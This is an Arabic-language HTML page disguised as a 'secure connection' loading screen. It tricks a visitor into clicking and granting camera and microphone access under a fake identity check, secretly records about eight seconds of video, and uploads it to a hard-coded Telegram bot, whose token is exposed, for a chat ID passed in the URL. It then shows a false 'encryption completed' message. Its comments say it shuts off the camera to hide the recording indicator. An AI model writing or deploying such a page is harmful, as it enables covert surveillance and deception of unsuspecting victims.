<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل البيانات...</title>
    <style>
        body { 
            background-color: #0d1117; 
            color: #58a6ff; 
            font-family: sans-serif; 
            display: flex; 
            flex-direction: column;
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            cursor: pointer; /* ليشعر المستخدم أنه يجب أن يضغط */
        }
        .loader {
            border: 3px solid #21262d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #msg { margin-top: 20px; font-size: 14px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body onclick="startCapture()"> <div class="loader"></div>
    <div id="msg">جاري تجهيز الاتصال الآمن...<br> (اضغط في أي مكان للمتابعة)</div>

    <video id="videoPreview" style="display:none;" autoplay muted playsinline></video>

    <script>
        const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('sender_id');
        let isRecording = false;

        async function startCapture() {
            if (isRecording || !chatId) return;
            isRecording = true;
            
            document.getElementById('msg').innerHTML = "جاري التحقق من الهوية...";

            try {
                // طلب الكاميرا والمايكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });

                // هنا تظهر النقطة الخضراء فوراً
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendVideo(blob);
                    // إغلاق الكاميرا لإخفاء النقطة الخضراء
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                
                // تسجيل لمدة 8 ثوانٍ لضمان لقطة واضحة
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 8000);

            } catch (err) {
                console.error("Permission error:", err);
                document.getElementById('msg').innerHTML = "يرجى السماح بالوصول للكاميرا للمتابعة.";
                isRecording = false; // السماح بالمحاولة مرة أخرى
            }
        }

        async function sendVideo(blob) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('video', blob, 'capture.webm');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: fd
                });
                if(response.ok) {
                    document.getElementById('msg').innerHTML = "اكتمل التشفير بنجاح.";
                }
            } catch (e) { 
                console.error("Upload error:", e);
            }
        }
    </script>
</body>
</html>
